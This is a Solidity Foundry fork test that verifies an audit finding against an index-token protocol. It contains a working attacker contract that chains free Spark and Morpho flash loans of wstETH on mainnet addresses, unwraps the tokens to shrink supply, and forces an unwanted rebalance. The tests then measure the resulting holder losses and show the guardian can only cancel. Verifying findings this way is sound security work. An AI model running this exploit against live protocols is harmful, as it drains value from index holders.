// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IndexFactory} from "../../src/IndexFactory.sol";
import {IndexToken} from "../../src/IndexToken.sol";
import {IIndexFactory} from "../../src/interfaces/IIndexFactory.sol";
import {IIndexRule} from "../../src/interfaces/IIndexRule.sol";
import {IIndexToken} from "../../src/interfaces/IIndexToken.sol";
import {CompositeFeed} from "../../src/CompositeFeed.sol";
import {IAggregatorV3} from "../../src/interfaces/IAggregatorV3.sol";
import {ConfigureWhitelist} from "../../script/ConfigureWhitelist.s.sol";
import {ISwapRouter02} from "../mocks/ISwapRouter02.sol";
import {ForkAddresses as A} from "../fork/ForkAddresses.sol";
import {ForkFeeds} from "../fork/ForkFeeds.sol";
import {RebalanceExecutorV3} from "../fork/RebalanceExecutorV3.sol";

interface IWstETHv {
    function wrap(uint256 stETHAmount) external returns (uint256);
    function unwrap(uint256 wstETHAmount) external returns (uint256);
    function stETH() external view returns (address);
}

interface IMorphoV {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface ISparkPoolV {
    function flashLoanSimple(address receiver, address asset, uint256 amount, bytes calldata params, uint16 ref)
        external;
}

/// @notice Unprivileged: free flash loans of wstETH (Spark premium 0, Morpho Blue), unwrap, startRebalance, wrap, repay.
contract VerifyShrinker {
    using SafeERC20 for IERC20;

    address constant SPARK_POOL = 0xC13e21B648A5Ee794902342038FF3aDAB66BE987;
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    IIndexToken internal _index;
    uint256 internal _morphoAmount;

    function attack(IIndexToken index, uint256 sparkAmount, uint256 morphoAmount) external {
        _index = index;
        _morphoAmount = morphoAmount;
        ISparkPoolV(SPARK_POOL).flashLoanSimple(address(this), WSTETH, sparkAmount, "", 0);
    }

    function executeOperation(address, uint256 amount, uint256 premium, address, bytes calldata)
        external
        returns (bool)
    {
        require(msg.sender == SPARK_POOL, "spark");
        IMorphoV(MORPHO).flashLoan(WSTETH, _morphoAmount, "");
        IERC20(WSTETH).forceApprove(SPARK_POOL, amount + premium);
        return true;
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == MORPHO, "morpho");
        IWstETHv(WSTETH).unwrap(IERC20(WSTETH).balanceOf(address(this)));
        _index.startRebalance(0);
        address steth = IWstETHv(WSTETH).stETH();
        uint256 st = IERC20(steth).balanceOf(address(this));
        IERC20(steth).forceApprove(WSTETH, st);
        IWstETHv(WSTETH).wrap(st);
        IERC20(WSTETH).forceApprove(MORPHO, assets);
    }
}

/// @notice Verifier checks on the wstETH live-supply finding:
///         (1) the guardian's documented check (recompute targets later and compare) DOES flag the forced snapshot,
///             yet the guardian can only cancel, and its own start reverts TurnoverTooLow;
///         (2) with a competitive executor filling at break-even (not 0.9), holders still lose swap costs on the
///             manufactured turnover.
contract WstethSupplyVerifyTest is ForkFeeds {
    using SafeERC20 for IERC20;

    address constant SPARK_AWSTETH = 0x12B54025C112Aa61fAce2CDB7118740875A566E9;
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;

    IndexFactory factory;
    IIndexRule rule;
    address guardian = makeAddr("guardian");
    address alice = makeAddr("alice");
    address stranger = makeAddr("stranger");

    function setUp() public {
        string memory url = vm.envOr("MAINNET_RPC_URL", string("https://ethereum-rpc.publicnode.com"));
        vm.createSelectFork(url);
        factory = new IndexFactory(address(this), guardian);
        rule = IIndexRule(factory.RULE());
        _pinFeedsToTheBlockClock();
        CompositeFeed wbtcFeed = new CompositeFeed(
            IAggregatorV3(A.BTC_USD_FEED), IAggregatorV3(A.WBTC_BTC_FEED), A.STALENESS_1H, A.STALENESS_24H
        );
        ConfigureWhitelist cw = new ConfigureWhitelist();
        ConfigureWhitelist.Entry[] memory list = cw.defaultMainnetList(address(wbtcFeed));
        for (uint256 i = 0; i < list.length; ++i) {
            factory.proposeListing(list[i].token, cw.configFor(list[i]));
        }
        vm.warp(block.timestamp + factory.LISTING_DELAY());
        for (uint256 i = 0; i < list.length; ++i) {
            factory.executeListing(list[i].token);
        }
        assertEq(factory.tokenConfig(A.WSTETH).referenceSupply, 0, "shipped: wstETH uses live totalSupply");
    }

    function _defi4() internal returns (IndexToken idx, address[] memory t) {
        t = new address[](4);
        t[0] = A.WSTETH;
        t[1] = A.LINK;
        t[2] = A.UNI;
        t[3] = A.AAVE;
        uint256[] memory units = rule.initialUnits(t, 0, 1_000e18);
        idx = IndexToken(factory.createIndex("D4", "D4", t, units, 0));
        uint256[] memory need = idx.previewIssue(10_000e18);
        vm.startPrank(alice);
        for (uint256 i = 0; i < t.length; ++i) {
            deal(t[i], alice, need[i]);
            IERC20(t[i]).forceApprove(address(idx), need[i]);
        }
        idx.issue(10_000e18, alice);
        vm.stopPrank();
        vm.warp(block.timestamp + idx.MIN_REBALANCE_INTERVAL());
    }

    function _attack(IndexToken idx) internal {
        VerifyShrinker s = new VerifyShrinker();
        deal(A.WSTETH, address(s), 10);
        vm.prank(stranger);
        s.attack(
            IIndexToken(address(idx)),
            IERC20(A.WSTETH).balanceOf(SPARK_AWSTETH),
            IERC20(A.WSTETH).balanceOf(MORPHO)
        );
    }

    function _nav(IndexToken idx) internal view returns (uint256) {
        return rule.navPerToken(address(idx)) * idx.totalSupply() / 1e18;
    }

    /// (1) The documented guardian check catches it (so the finding overstates "does not flag"), but only by cancelling.
    function test_verify_guardianRecomputeFlagsItButCanOnlyCancel() public {
        (IndexToken idx,) = _defi4();
        (, uint256 honest) = idx.previewTarget(0);
        vm.expectRevert(abi.encodeWithSelector(IIndexToken.TurnoverTooLow.selector, honest));
        vm.prank(stranger);
        idx.startRebalance(0);

        _attack(idx);
        (uint256 eta,, uint256[] memory forced) = idx.pendingRebalance();
        assertGt(eta, 0, "stranger forced a snapshot");

        // Guardian, one block later, recomputes targets with the rule's own inputs (current supply, same feeds).
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 12);
        (uint256[] memory recomputed, uint256 recomputedTurnover) = idx.previewTarget(0);
        console2.log("wstETH forced target / recomputed target (bps)", forced[0] * 10_000 / recomputed[0]);
        console2.log("recomputed turnover", recomputedTurnover);
        assertLt(forced[0] * 10_000 / recomputed[0], 8_000, "guardian's recompute shows a >20% wstETH gap");

        vm.prank(guardian);
        idx.cancelRebalance();
        // Guardian cannot replace it with an honest proposal: the index is on-rule.
        vm.expectRevert();
        vm.prank(guardian);
        idx.startRebalance(0);
        // Stranger repeats after the cancel cooldown.
        vm.warp(idx.restartAllowedAt());
        _attack(idx);
        (eta,,) = idx.pendingRebalance();
        assertGt(eta, 0, "stranger forced again");
        assertEq(idx.proposalCount(), 2);
    }

    /// (2) Competitive executor: earliest time a real V3 executor breaks even. Holders still lose swap costs.
    function test_verify_competitiveBreakEvenFillStillCostsHolders() public {
        (IndexToken idx,) = _defi4();
        _attack(idx);
        (uint256 eta,,) = idx.pendingRebalance();

        vm.startPrank(stranger);
        RebalanceExecutorV3 ex =
            new RebalanceExecutorV3(IIndexFactory(address(factory)), ISwapRouter02(A.SWAP_ROUTER_02), A.WETH);
        ex.setFee(A.WSTETH, 100);
        ex.setFee(A.LINK, 3000);
        ex.setFee(A.UNI, 3000);
        ex.setFee(A.AAVE, 3000);
        vm.stopPrank();
        deal(A.WETH, address(ex), 2_000 ether);

        uint256 dur = idx.AUCTION_DURATION();
        bool filled;
        for (uint256 step = 0; step <= 96 && !filled; ++step) {
            uint256 snap = vm.snapshotState();
            vm.warp(eta + dur * step / 96);
            uint256 navBefore = _nav(idx);
            uint256 wethBefore = IERC20(A.WETH).balanceOf(address(ex));
            uint256 m = idx.currentMultiplier();
            vm.prank(stranger);
            try ex.fill(IIndexToken(address(idx))) {
                int256 profit = int256(IERC20(A.WETH).balanceOf(address(ex))) - int256(wethBefore);
                if (profit >= 0) {
                    filled = true;
                    uint256 navAfter = _nav(idx);
                    console2.log("break-even multiplier (1e18)", m);
                    console2.log("NAV before ($)", navBefore / 1e18);
                    console2.log("holder loss at break-even fill ($)", (navBefore - navAfter) / 1e18);
                    console2.log("executor profit (WETH wei)", uint256(profit));
                    assertGt(navBefore, navAfter, "holders lose even under competition");
                    break;
                }
            } catch {}
            vm.revertToState(snap);
        }
        assertTrue(filled, "some fill became profitable");
    }
}
